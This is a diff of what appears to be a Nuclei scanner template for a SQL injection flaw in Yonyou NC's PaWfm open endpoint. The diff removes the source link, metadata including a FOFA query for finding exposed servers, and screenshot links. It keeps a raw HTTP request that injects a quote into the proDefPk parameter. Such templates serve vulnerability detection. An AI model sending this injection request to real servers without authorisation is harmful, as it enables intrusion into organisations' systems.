@@ -3,12 +3,8 @@ info:
   name: 用友NC PaWfm open存在SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fgg9x6wgo1yh3y87'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fgg9x6wgo1yh3y87
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /portal/pt/PaWfm/open?pageId=login&proDefPk=1'' HTTP/1.1
@@ -29,12 +25,7 @@ http:
 
     Cookie: JSESSIONID=7717AB57F8AD7F26C97F76F77D494F04.ncMem01
 
-    Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792827865-ab632a58-9e1f-4d0b-bf4b-2ec34a452e29.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792828197-b59ea85d-728f-4bb5-9759-a35d5d6e3bfc.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
